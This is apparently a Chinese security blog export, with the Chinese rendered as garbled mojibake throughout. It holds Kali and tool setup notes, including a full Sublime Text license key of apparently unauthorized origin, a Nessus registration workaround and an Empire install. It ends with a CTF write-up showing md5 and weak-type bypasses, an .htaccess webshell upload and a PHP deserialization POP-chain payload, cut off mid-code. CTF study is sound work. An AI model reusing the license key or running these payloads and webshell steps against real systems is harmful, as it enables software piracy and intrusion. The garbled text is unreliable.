<p> è®¾ç½®å¿«æ·é”® ï¼Œé¦–é€‰é¡¹-&gt;å¿«æ·é”®è®¾ç½® åœ¨userè¿™æ å¡«ä¸Š</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">"keys"</span>: [<span class="string">"f5"</span>],</span><br><span class="line">    <span class="attr">"caption"</span>: <span class="string">"SublimeREPL: Python - RUN current file"</span>,</span><br><span class="line">    <span class="attr">"command"</span>: <span class="string">"run_existing_window_command"</span>,</span><br><span class="line">    <span class="attr">"args"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"repl_python_run"</span>,</span><br><span class="line">        <span class="attr">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">"keys"</span>: [<span class="string">"ctrl+f5"</span>],</span><br><span class="line">    <span class="attr">"caption"</span>: <span class="string">"SublimeREPL: Python - PDB current file"</span>,</span><br><span class="line">    <span class="attr">"command"</span>: <span class="string">"run_existing_window_command"</span>,</span><br><span class="line">    <span class="attr">"args"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"repl_python_pdb"</span>,</span><br><span class="line">        <span class="attr">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span>&#125;</span><br><span class="line">    &#125;,   </span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p> f5è¿è¡Œpython  ctrl+f5 pdbè°ƒè¯•python</p>
</li>
<li><p>æ³¨å†Œç </p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">----- BEGIN LICENSE -----</span><br><span class="line">Member J2TeaM</span><br><span class="line">Single User License</span><br><span class="line">EA7E<span class="number">-1011316</span></span><br><span class="line">D7DA350E <span class="number">1</span>B8B0760 <span class="number">972</span>F8B60 F3E64036</span><br><span class="line">B9B4E234 F356F38F <span class="number">0</span>AD1E3B7 <span class="number">0E9</span>C5FAD</span><br><span class="line">FA0A2ABE <span class="number">25</span>F65BD8 D51458E5 <span class="number">3923</span>CE80</span><br><span class="line"><span class="number">87428428</span> <span class="number">79079</span>A01 AA69F319 A1AF29A4</span><br><span class="line">A684C2DC <span class="number">0</span>B1583D4 <span class="number">19</span>CBD290 <span class="number">217618</span>CD</span><br><span class="line"><span class="number">5653E0</span>A0 BACE3948 BB2EE45E <span class="number">422</span>D2C87</span><br><span class="line">DD9AF44B <span class="number">99</span>C49590 D2DBDEE1 <span class="number">75860</span>FD2</span><br><span class="line"><span class="number">8</span>C8BB2AD B2ECE5A4 EFC08AF2 <span class="number">25</span>A9B864</span><br><span class="line">------ END LICENSE ------</span><br></pre></td></tr></table></figure>

<h3 id="4-å®‰è£…AWVS13"><a href="#4-å®‰è£…AWVS13" class="headerlink" title="4.å®‰è£…AWVS13"></a>4.å®‰è£…AWVS13</h3><p> awvså®‰è£…åŒ…ä¸‹è½½ <code>http://0verflow.cn/?p=1463</code></p>
</li>
</ol>
<pre><code>![image-20200422221053236](kaliå®‰è£…ä¸é…ç½®/image-20200422221053236.png)

![image-20200422221147845](kaliå®‰è£…ä¸é…ç½®/image-20200422221147845.png)</code></pre><p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422221208598.png" alt="image-20200422221208598"></p>
<h3 id="4-å®‰è£…nessus"><a href="#4-å®‰è£…nessus" class="headerlink" title="4.å®‰è£…nessus"></a>4.å®‰è£…nessus</h3><p><a href="https://www.tenable.com/downloads/nessus?loginAttempted=true" target="_blank" rel="noopener">Nessuså®˜ç½‘</a>ä¸‹è½½å¯¹äºç‰ˆæœ¬çš„å®‰è£…åŒ…</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230607599.png" alt="image-20200422230607599"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230308965.png" alt="image-20200422230308965"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230627297.png" alt="image-20200422230627297"></p>
<p>æ¥ä¸‹æ¥è´¦å·å¯†ç éšæ„ï¼Œè®°å¾—å°±è¡Œ</p>
<p>è¿›å…¥è¿™ä¸ªé¡µé¢å</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230745749.png" alt="image-20200422230745749"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422231111879.png" alt="image-20200422231111879"></p>
<p>å¾—åˆ°challenge code</p>
<p>ç„¶åå»<a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true" target="_blank" rel="noopener">å®˜ç½‘æ³¨å†Œ</a>ä¸€ä¸ªè´¦å·ï¼Œé‚®ç®±å¿…é¡»æ˜¯æœ‰æ•ˆçš„ å¾—åˆ°activation code </p>
<p>åˆ°<code>https://plugins.nessus.org/offline.php</code>æäº¤å®ƒä»¬ï¼Œä¸‹è½½æ’ä»¶åŒ…</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422235202520.png" alt="image-20200422235202520"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200423001848981.png" alt="image-20200423001848981"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200423001748972.png" alt="image-20200423001748972"></p>
<p>å°†plugin_feed_info.incæ–‡ä»¶æ›¿æ¢åˆ°<code>/opt/nessus/var/nessus/</code>ç›®å½• å’Œ<code>/opt/nessus/lib/nessus/plugins/</code>ç›®å½•</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200423002118121.png" alt="image-20200423002118121"></p>
<h3 id="5-å®‰è£…pip"><a href="#5-å®‰è£…pip" class="headerlink" title="5.å®‰è£…pip"></a>5.å®‰è£…pip</h3><ol>
<li><p>pip2</p>
<p> <code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code></p>
<p> <code>sudo python2 get-pip.py</code></p>
</li>
<li><p>pip3</p>
<p> <code>sudo apt-get install python3-pip</code></p>
</li>
</ol>
<h3 id="6-å®‰è£…Empire"><a href="#6-å®‰è£…Empire" class="headerlink" title="6.å®‰è£…Empire"></a>6.å®‰è£…Empire</h3><p>1.ä¸‹è½½Empire</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/EmpireProject/Empire.git</span><br></pre></td></tr></table></figure>

<p>2.æ›´æ–°&amp;&amp;å®‰è£…ä¾èµ–</p>
<p>python-dev(yumä¸­æ˜¯python-devel)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install make g++ python-dev swig python-pip libxml2-dev default-jdk libssl1.0.0 libssl-dev build-essential</span><br><span class="line"><span class="built_in">cd</span> /Empire/setup</span><br><span class="line">sudo pip2 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç¢°åˆ°pyinstallerå®‰è£…å¤±è´¥å°±è¿è¡Œä¸‹é¢çš„è¯­å¥</p>
<p> <code>pip2 install pyinstaller --no-use-pep517</code></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200513224644533.png" alt="image-20200513224644533"></p>
<p>å†æ¥ä¸€é <code>sudo pip2 install -r requirements.txt</code></p>
<p>3.ç¼–è¯‘å®‰è£…M2CryptoåŒ…</p>
<p>ç›´æ¥ç”¨è„šæœ¬æ˜¯è£…ä¸ä¸Šçš„ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/mcepl/M2Crypto</span><br><span class="line"><span class="built_in">cd</span> M2Crypto</span><br><span class="line">sudo python setup.py build</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>

<p> 4.æ­£å¼å®‰è£…</p>
<p><code>sudo ./start.sh</code></p>
<p>è¿™ä¸‹åº”è¯¥ä¸ä¼šæŠ¥é”™äº†</p>
<p>æ¥ç€</p>
<p><code>sudo ./reset.sh</code></p>
<p>æ¥ç€å¯èƒ½ä¼šæŠ¥ç¼ºå°‘ä»€ä¹ˆä»€ä¹ˆåŒ…ï¼Œç¼ºå•¥ç›´æ¥è£…å•¥</p>
<p>æœ€åreset.sh è¿è¡ŒæˆåŠŸå°±å®‰è£…æˆåŠŸäº†</p>
]]></content>
      <categories>
        <category>ç¯å¢ƒæ­å»º</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Cæ®µæ‰«æè„šæœ¬</title>
    <url>/2020/03/C%E6%AE%B5%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="3934c513ecbb2623b88902986369fef131ea022bafa76fe01ccc1749f59d5fb2">94a100f5d0b5181212cd7852ebe43024</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>tag1</tag>
        <tag>tag2</tag>
        <tag>tag3</tag>
      </tags>
  </entry>
  <entry>
    <title>2020åŒ—é‚®æ ¡èµ›</title>
    <url>/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ez-bypass"><a href="#1-Ez-bypass" class="headerlink" title="1.Ez_bypass"></a>1.Ez_bypass</h3><p>æ‰“å¼€ç½‘é¡µç›´æ¥æœ‰æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                    $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">                    <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                                &#123;   <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                                    highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                                    <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>ç¬¬ä¸€å±‚md5ç»•è¿‡å¯ä»¥ç”¨æ•°ç»„æˆ–è€…<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">md5ç¢°æ’</a>,ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒç›´æ¥åœ¨1234567åé¢åŠ ä¸ªéæ•°å­—å­—ç¬¦å°±è¡Œ</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327185855883.png" alt="image-20200327185855883"></p>
<p>æˆ‘è¿™åŠ äº†ä¸ªç©ºæ ¼(é‚£ä¸ª0å¯ä»¥æ— è§†äº† -_-!)</p>
<h3 id="2-PYWebsite"><a href="#2-PYWebsite" class="headerlink" title="2.PYWebsite"></a>2.PYWebsite</h3><p>æ‰“å¼€ç½‘ç«™èŠ±é‡Œèƒ¡å“¨çš„ï¼Œç›´æ¥çœ‹æºç </p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205601093.png" alt="image-20200327205601093"></p>
<p>ç›´æ¥çœ‹flag.phpé¡µé¢</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205642253.png" alt="image-20200327205642253"></p>
<p>æ ¹æ®æç¤ºåº”è¯¥æ˜¯æ”¹XFFå¤´</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205656797.png" alt="image-20200327205656797"></p>
<h3 id="3-ä½ ä¼ ä½ ğŸå‘¢"><a href="#3-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="3.ä½ ä¼ ä½ ğŸå‘¢"></a>3.ä½ ä¼ ä½ ğŸå‘¢</h3><p>å…ˆä¸Šä¼ .htaccessï¼Œæ–‡ä»¶å†…å®¹ï¼š SetHandler application/x-httpd-php </p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202846073.png" alt="image-20200327202846073"></p>
<p>æ¥ç€ä¸Šä¼ é©¬</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202924100.png" alt="image-20200327202924100"></p>
<p>è¿™ä¸ªé©¬æŒ‚äº†ä»£ç†æ‰è¿ä¸Š åäº†</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202736128.png" alt="image-20200327202736128"></p>
<h3 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4.Ezpop"></a>4.Ezpop</h3><p>ç›´æ¥æœ‰æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¸¸è§çš„é­”æœ¯æ–¹æ³•</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__construct</span>()ï¼Œç±»çš„æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚</span><br><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure>

<p>__toString è§¦å‘çš„æ¡ä»¶æ¯”è¾ƒå¤š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</span><br></pre></td></tr></table></figure>

<p>å…³é”®åœ¨<code>Modifier</code>ç±»ï¼Œå¦‚æœ$varä¸ºä¼ªåè®®é‚£ä¹ˆå¯è¯»flag.phpã€‚è¦è§¦å‘<code>Modifierçš„ __invoke()</code> å°±å¿…é¡»è§¦å‘<code>Testçš„__get()</code> ,è¦è§¦å‘<code>Testçš„__get()</code> å°±å¿…é¡»è®¿é—®<code>Testä¸­ä¸€ä¸ªä¸èƒ½è®¿é—®çš„ç±»æˆå‘˜</code> ã€‚è€Œåœ¨<code>Show</code> ä¸­çš„<code>__toSting</code> æ–¹æ³•<code>$this-&gt;str-&gt;source</code> æ˜æ˜¾æ˜¯ä¸èƒ½è®¿é—®çš„ã€‚æ‰€ä»¥æ„é€ å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var= <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str =<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>(urlencode($b));</span><br></pre></td></tr></table></figure>

<h3 id="5-å¥—å¨ƒ"><a href="#5-å¥—å¨ƒ" class="headerlink" title="5.å¥—å¨ƒ"></a>5.å¥—å¨ƒ</h3><p>ç¬¬ä¸€å±‚</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328143848747.png" alt="image-20200328143848747"></p>
<p>è¿™é‡Œç¬¬ä¸€ä¸ªä¸»è¦æ˜¯åŒ¹é…äº†<code>_</code>ï¼Œå› ä¸º$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šurldecodeæ‰€ä»¥ä¸€èˆ¬å¥—è·¯æ˜¯å¯ä»¥URLç¼–ç ï¼Œä½†æ˜¯æœ¬é¢˜ç›®banæ‰äº†<code>_</code>çš„ç¼–ç å€¼<code>%5f</code> ç»•è¿‡æ–¹æ³•ï¼š</p>
<ol>
<li>%5F</li>
<li>b.u.p.tï¼ˆç‚¹ä»£æ›¿_ï¼‰</li>
<li>b u p tï¼ˆç©ºæ ¼ä»£æ›¿_ï¼‰</li>
</ol>
<p>ç¬¬äºŒä¸ªç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328143918754.png" alt="image-20200328143918754"></p>
<p>è®¿é—®secrettw.phpæ²¡å•¥ç‰¹åˆ«çš„å°±æŠ“åŒ…çœ‹äº†ä¸‹</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328144148256.png" alt="image-20200328144148256"></p>
<p>æ”¾åˆ°æ§åˆ¶å°è·‘äº†ä¸€ä¸‹</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328144220283.png" alt="image-20200328144220283"></p>
<p>æœ‰äº†æç¤ºå°±å¥½åŠï¼Œä½†è¦æ³¨æ„å› ä¸ºä¹‹å‰æ˜¯æŠ“çš„GETåŒ…æ‰€ä»¥headersè¦åŠ ä¸Šcontent-typeè¿™ä¸ªå­—æ®µæˆ–è€…ç›´æ¥ç”¨Hackbar</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">getè¯·æ±‚çš„headersä¸­æ²¡æœ‰content-<span class="keyword">type</span>è¿™ä¸ªå­—æ®µï¼Œpost çš„ content-<span class="keyword">type</span> æœ‰ä¸¤ç§ ï¼š</span><br><span class="line"></span><br><span class="line">application/x-www-<span class="keyword">form</span>-urlencoded </span><br><span class="line">è¿™ç§å°±æ˜¯ä¸€èˆ¬çš„æ–‡æœ¬è¡¨å•</span><br><span class="line">multipart/<span class="keyword">form</span>-<span class="keyword">data</span> </span><br><span class="line">æ–‡ä»¶è¡¨å•çš„ä¼ è¾“</span><br></pre></td></tr></table></figure>

<p>POST Merakåä¼šæœ‰æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    